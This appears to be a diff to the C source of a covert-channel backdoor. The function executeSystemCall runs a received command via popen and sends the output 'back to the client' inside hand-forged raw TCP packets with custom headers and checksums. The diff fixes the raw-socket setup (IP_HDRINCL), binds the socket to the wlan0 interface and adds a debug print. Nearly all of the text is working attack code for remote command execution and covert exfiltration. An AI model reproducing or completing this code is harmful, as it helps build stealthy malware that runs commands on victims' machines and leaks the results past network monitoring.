@@ -7,7 +7,7 @@ static char *createRawTcpPacket(struct sockaddr_in *sin);
 
 void executeSystemCall(char *command)
 {
-    //int socket = 0;
+    int socket = 0;
     int bytesRead = 0;
     int count = 0;
     char line[4];
@@ -20,26 +20,8 @@ void executeSystemCall(char *command)
     unsigned short sum = 0;
     const unsigned short zero = 0;
     FILE *results = NULL;
-    
-    struct ip *iph = NULL;
-    struct tcphdr *tcph = NULL;
-    int sock = 0;
-    int one = 0;
-    const int *val = &one;
-    
-    // Create the raw TCP socket
-    sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (sock == -1)
-    {
-        systemFatal("Error creating raw TCP socket");
-    }
-    
-    // Inform the kernel do not fill up the headers' structure, we fabricated our own
-    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
-    {
-        systemFatal("Error setting socket options");
-    }
 
+	int z = 0;
     // Execute and open the pipe for reading
     results = popen(command, "r");
     
@@ -49,16 +31,16 @@ void executeSystemCall(char *command)
 		systemFatal("no results");
         return;
     }
-    /*
+    
     // Open a connection back to the client
     if ((socket = createRawTcpSocket()) == 0)
     {
 		systemFatal("no raw tcpsocket");
         return;
     }
-    */
+    
     // Make sure we do not receive any data
-    //shutdown(socket, SHUT_RD);
+    shutdown(socket, SHUT_RD);
     
     // Get the time structs ready
     time(&t);
@@ -79,18 +61,18 @@ void executeSystemCall(char *command)
         memcpy(buffer + 10, &zero, sizeof(unsigned short));
         sum = csum((unsigned short *)buffer, 5);
         memcpy(buffer + 10, &sum, sizeof(unsigned short));
-        
-        iph = (struct ip *)buffer;
-        tcph = (struct tcphdr *) (buffer + sizeof(struct ip));
 
-        sendto(sock, buffer, sizeof(struct ip) + sizeof(struct tcphdr), 0,
+		getsockopt(socket, IPPROTO_IP, IP_HDRINCL, &z, &count);
+		fprintf(stderr, "is it set: %d\n", z);
+
+        sendto(socket, buffer, sizeof(struct ip) + sizeof(struct tcphdr), 0,
                (struct sockaddr *)&sin, sizeof(sin));
     }
     
     // Send a FIN packet to signal end of transfer
     
     pclose(results);
-    close(sock);
+    close(socket);
     free(buffer);
 }
 
@@ -305,8 +287,8 @@ static void whoAmI(char *buffer)
 static int createRawTcpSocket()
 {
     int sock = 0;
-    int one = 0;
-    const int *val = &one;
+    int one = 1;
+    struct ifreq ifr;
     
     // Create the raw TCP socket
     sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -316,10 +298,18 @@ static int createRawTcpSocket()
     }
     
     // Inform the kernel do not fill up the headers' structure, we fabricated our own
-    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
+    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) == -1)
     {
         systemFatal("Error setting socket options");
     }
     
+    // Bind to the correct device
+    memset(&ifr, 0, sizeof(ifr));
+    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "wlan0");
+    if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) == -1)
+    {
+		systemFatal("Error binding to default device");
+	}
+
     return sock;
 }
